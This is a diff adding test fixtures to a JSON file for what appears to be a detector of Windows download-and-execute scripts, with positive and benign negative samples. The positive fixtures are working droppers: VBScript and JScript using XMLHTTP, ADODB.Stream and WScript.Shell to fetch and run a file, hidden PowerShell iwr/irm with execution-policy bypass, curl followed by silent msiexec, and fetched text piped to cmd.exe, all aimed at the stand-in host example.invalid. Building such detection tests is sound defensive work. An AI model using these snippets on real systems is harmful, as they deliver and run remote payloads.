@@ -176,5 +176,92 @@
     "name": "bitsadmin_list.cmd",
     "text": "bitsadmin /list /allusers\n",
     "expected": null
+  },
+  {
+    "name": "vbs_fetch_run.vbs",
+    "text": "Set o = CreateObject(\"MSXML2.XMLHTTP\")\r\no.Open \"GET\", \"https://example.invalid/inert.exe\", False\r\no.Send\r\nSet a = CreateObject(\"ADODB.Stream\")\r\na.Open\r\na.Write o.ResponseBody\r\na.SaveToFile \"inert.exe\", 2\r\nSet s = CreateObject(\"WScript.Shell\")\r\ns.Run \"inert.exe\", 0, False\r\n",
+    "expected": "win_script_host_fetch_run"
+  },
+  {
+    "name": "vbs_fetch_run_utf16.bin",
+    "text": "Set o = CreateObject(\"MSXML2.XMLHTTP\")\r\no.Open \"GET\", \"https://example.invalid/inert.exe\", False\r\no.Send\r\nSet a = CreateObject(\"ADODB.Stream\")\r\na.Open\r\na.Write o.ResponseBody\r\na.SaveToFile \"inert.exe\", 2\r\nSet s = CreateObject(\"WScript.Shell\")\r\ns.Run \"inert.exe\", 0, False\r\n",
+    "expected": "win_script_host_fetch_run",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "vbs_fetch_run.zip",
+    "text": "Set o = CreateObject(\"MSXML2.XMLHTTP\")\r\no.Open \"GET\", \"https://example.invalid/inert.exe\", False\r\no.Send\r\nSet a = CreateObject(\"ADODB.Stream\")\r\na.Open\r\na.Write o.ResponseBody\r\na.SaveToFile \"inert.exe\", 2\r\nSet s = CreateObject(\"WScript.Shell\")\r\ns.Run \"inert.exe\", 0, False\r\n",
+    "expected": "win_script_host_fetch_run",
+    "container": "zip"
+  },
+  {
+    "name": "js_fetch_run.js",
+    "text": "var x = new ActiveXObject(\"MSXML2.XMLHTTP\"); x.open(\"GET\", \"https://example.invalid/inert.exe\", false); x.send();\nvar s = new ActiveXObject(\"WScript.Shell\"); s.Run(\"inert.exe\", 0, false);\n",
+    "expected": "win_script_host_fetch_run"
+  },
+  {
+    "name": "jse_winhttp_exec.jse",
+    "text": "var h = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\"); h.Open(\"GET\", \"https://example.invalid/i.txt\", false); h.Send();\nvar sh = new ActiveXObject(\"Shell.Application\"); sh.ShellExecute(\"cmd.exe\", \"/c \" + h.ResponseText, \"\", \"open\", 0);\n",
+    "expected": "win_script_host_fetch_run"
+  },
+  {
+    "name": "wsf_local_fetch_run.wsf",
+    "text": "<job id=\"x\"><script language=\"VBScript\">Set o = CreateObject(\"Microsoft.XMLHTTP\")\r\no.Open \"GET\", \"https://example.invalid/inert.exe\", False\r\nSet s = CreateObject(\"WScript.Shell\")\r\ns.Run \"inert.exe\"</script></job>",
+    "expected": "win_script_host_fetch_run"
+  },
+  {
+    "name": "vbs_logon_shell_only.vbs",
+    "text": "Set s = CreateObject(\"WScript.Shell\")\r\ns.Run \"net use H: \\\\fileserver\\home\", 0, True\r\n",
+    "expected": null
+  },
+  {
+    "name": "vbs_inventory_xmlhttp_only.vbs",
+    "text": "Set o = CreateObject(\"MSXML2.XMLHTTP\")\r\no.Open \"POST\", \"https://intranet.example/inventory\", False\r\no.Send hostname\r\n",
+    "expected": null
+  },
+  {
+    "name": "js_ajax_polyfill.js",
+    "text": "function xhr() { try { return new XMLHttpRequest(); } catch (e) { return new ActiveXObject(\"Microsoft.XMLHTTP\"); } }\n",
+    "expected": null
+  },
+  {
+    "name": "vbs_lure_writeup.md",
+    "text": "For example, the following VBScript creates an MSXML2.XMLHTTP object with CreateObject(), saves the body through ADODB.Stream, and calls WScript.Shell .Run on it.\n",
+    "expected": null
+  },
+  {
+    "name": "cmd_iwr_start.cmd",
+    "text": "@echo off\r\npowershell -nop -w hidden -c \"iwr https://example.invalid/inert.exe -OutFile %TEMP%\\inert.exe; start %TEMP%\\inert.exe\"\r\n",
+    "expected": "win_cmd_fetch_start"
+  },
+  {
+    "name": "bat_curl_next_line_start.bat",
+    "text": "@echo off\r\ncurl -sL -o %TEMP%\\setup.msi https://example.invalid/setup.msi\r\nmsiexec /qn /i %TEMP%\\setup.msi\r\n",
+    "expected": "win_cmd_fetch_start"
+  },
+  {
+    "name": "ps1_irm_call.ps1",
+    "text": "irm https://example.invalid/inert.ps1 -OutFile $env:TEMP\\inert.ps1; powershell -ep bypass -File $env:TEMP\\inert.ps1\n",
+    "expected": "win_cmd_fetch_start"
+  },
+  {
+    "name": "cmd_iwr_download_only.cmd",
+    "text": "@echo off\r\npowershell -c \"iwr https://example.invalid/report.pdf -OutFile %USERPROFILE%\\Downloads\\report.pdf\"\r\n",
+    "expected": null
+  },
+  {
+    "name": "cmd_start_local.cmd",
+    "text": "@echo off\r\nstart \"\" notepad.exe %1\r\ncall build.bat\r\n",
+    "expected": null
+  },
+  {
+    "name": "cmd_curl_then_echo.bat",
+    "text": "@echo off\r\ncurl -o tools.zip https://example.invalid/tools.zip\r\necho downloaded tools.zip\r\n",
+    "expected": null
+  },
+  {
+    "name": "cmd_lure_writeup.md",
+    "text": "The following command is a common lure: curl -o x.exe https://example.invalid/x.exe && start x.exe\n",
+    "expected": null
   }
 ]
